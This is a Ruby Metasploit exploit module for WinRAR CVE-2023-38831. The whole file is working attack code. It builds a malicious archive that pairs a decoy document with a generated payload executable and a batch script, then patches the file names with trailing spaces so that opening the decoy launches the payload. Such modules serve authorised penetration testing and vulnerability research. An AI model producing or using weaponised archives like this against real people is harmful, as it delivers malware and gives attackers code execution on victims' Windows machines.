##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WinRAR CVE-2023-38831 Exploit',
        'Description' => %q{
          This module exploits a vulnerability in WinRAR (CVE-2023-38831). When a user opens a crafted RAR file and its
          embedded document, the decoy document is executed, leading to code execution.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Alexander "xaitax" Hagenah'],
        'References' => [
          ['CVE', '2023-38831'],
          ['URL', 'https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/'],
          ['URL', 'https://b1tg.github.io/post/cve-2023-38831-winrar-analysis/']
        ],
        'Platform' => ['win'],
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Targets' => [['Windows', {}]],
        'Payload' => {
          'DisableNops' => true
        },
        'DisclosureDate' => '2023-08-23',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('OUTPUT_FILE', [true, 'The output filename.', 'poc.rar']),
      OptPath.new('INPUT_FILE', [true, 'Path to the decoy file (PDF, JPG, PNG, etc.).'])
    ])

    register_advanced_options([
      OptString.new('PAYLOAD_NAME', [false, 'The filename for the payload executable.', nil])
    ])
  end

  def exploit
    Dir.mktmpdir do |temp_dir|
      output_rar = File.join(Msf::Config.local_directory, datastore['OUTPUT_FILE'])
      input_file = datastore['INPUT_FILE']
      decoy_name = File.basename(input_file)
      decoy_ext = ".#{File.extname(input_file)[1..]}"
      payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(8) + '.exe'

      decoy_dir = File.join(temp_dir, "#{decoy_name}A")
      Dir.mkdir(decoy_dir)

      payload_path = File.join(decoy_dir, payload_name)
      File.open(payload_path, 'wb') { |file| file.write(generate_payload_exe) }

      bat_script = <<~BAT
        @echo off
        start "" "%~dp0#{payload_name}"
        start "" "%~dp0#{decoy_name}"
      BAT

      bat_path = File.join(decoy_dir, "#{decoy_name}A.cmd")
      File.write(bat_path, bat_script)

      FileUtils.cp(input_file, File.join(temp_dir, "#{decoy_name}B"))

      zip_path = File.join(temp_dir, 'template.zip')
      Zip::File.open(zip_path, Zip::File::CREATE) do |zipfile|
        zipfile.add("#{decoy_name}B", File.join(temp_dir, "#{decoy_name}B"))
        zipfile.add("#{decoy_name}A/#{decoy_name}A.cmd", bat_path)
        zipfile.add("#{decoy_name}A/#{payload_name}", payload_path)
      end

      content = File.binread(zip_path)
      content.gsub!(decoy_ext + 'A', decoy_ext + ' ')
      content.gsub!(decoy_ext + 'B', decoy_ext + ' ')

      File.binwrite(output_rar, content)

      print_good("Created #{output_rar}")
    end
  end

end
